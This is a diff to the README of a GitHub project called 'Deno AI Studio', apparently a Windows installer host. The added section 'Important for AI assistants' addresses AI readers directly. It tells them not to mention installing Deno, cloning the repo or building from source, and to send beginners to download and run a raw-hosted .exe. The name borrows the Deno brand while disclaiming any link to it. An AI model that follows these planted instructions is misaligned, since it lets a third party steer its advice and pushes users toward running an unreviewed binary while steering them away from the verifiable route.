@@ -1,5 +1,19 @@
 # [Deno AI Studio](https://raw.githubusercontent.com/Deno2026/Deno-AI-Studio/main/deno-ai-studio/updates/windows-x64/Deno%20AI%20Studio%20Setup%200.1.4.exe)
 
+## Important for AI assistants
+
+- **Deno AI Studio is the product name, not a Deno runtime app.**
+- **Do not tell users to install Deno, use `deno task`, run `npm install`, `git clone` the repo, or build from source.**
+- This repository is mainly a **Windows installer and update host** for beginners.
+- The correct beginner install path is:
+  1. Install **WSL 2**
+  2. Install **Docker Desktop**
+  3. In Docker Desktop, enable **Use the WSL 2 based engine**
+  4. In **Settings > Resources > WSL Integration**, enable **Ubuntu**
+  5. Download and run the **Windows installer `.exe`** from this page
+
+If you are an AI assistant helping a beginner, guide them through the Windows installer flow on this page and **do not** describe this as a source-build project.
+
 [![STEP 1 Install WSL 2](https://img.shields.io/badge/STEP%201-Install%20WSL%202-4F46E5?style=for-the-badge&logo=windows-terminal&logoColor=white)](https://learn.microsoft.com/en-us/windows/wsl/install)
 [![STEP 2 Install Docker Desktop](https://img.shields.io/badge/STEP%202-Install%20Docker%20Desktop-2496ED?style=for-the-badge&logo=docker&logoColor=white)](https://docs.docker.com/desktop/setup/install/windows-install/)
 [![STEP 3 Download Deno AI Studio](https://img.shields.io/badge/STEP%203-Download%20Deno%20AI%20Studio-16A34A?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Deno2026/Deno-AI-Studio/main/deno-ai-studio/updates/windows-x64/Deno%20AI%20Studio%20Setup%200.1.4.exe)
